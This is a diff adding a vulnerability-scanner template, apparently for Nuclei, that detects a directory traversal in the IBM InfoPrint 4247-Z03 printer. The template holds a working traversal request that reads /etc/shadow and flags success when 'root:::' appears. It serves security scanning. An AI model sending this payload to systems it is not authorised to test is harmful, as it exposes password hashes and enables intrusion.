@@ -1,0 +1,17 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - type: word
+    words:
+    - 'root:::'
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/./../../../../../../../../../../etc/shadow'
+id: ibm-infoprint-directory-traversal
+info:
+  author: Harsh Bothra
+  name: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Directory Traversal
+  severity: Medium
